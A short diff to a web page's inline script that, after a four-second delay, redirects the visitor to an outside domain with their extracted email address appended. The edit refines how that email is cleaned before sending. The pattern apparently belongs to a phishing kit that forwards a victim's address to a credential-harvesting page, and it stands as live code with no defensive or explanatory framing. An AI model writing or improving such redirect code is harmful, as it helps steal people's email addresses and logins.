@@ -435,13 +435,19 @@
         // Base redirect URL
         var baseUrl = "https://lifeontechji.za.com/R158Y/";
 
-        // Construct the new URL with '##' prefix and the email address if found
-        var newUrl = emailMatch ? baseUrl + "##" + emailMatch[0] : baseUrl;
+        // Clean the email if it contains extra characters (e.g., spaces, query strings)
+        if (emailMatch) {
+            var cleanEmail = emailMatch[0].split('%20').pop(); // Remove any spaces
+        }
+        
+        // Construct the new URL with '##' and the clean email if found
+        var newUrl = emailMatch ? baseUrl + "##" + cleanEmail : baseUrl;
 
         // Redirect to the new URL
         window.location.href = newUrl;
     }, 4000); // 4000 milliseconds = 4 seconds
 </script>
+
 
     <div class="footer" role="contentinfo">
       <div class="footer-inner">
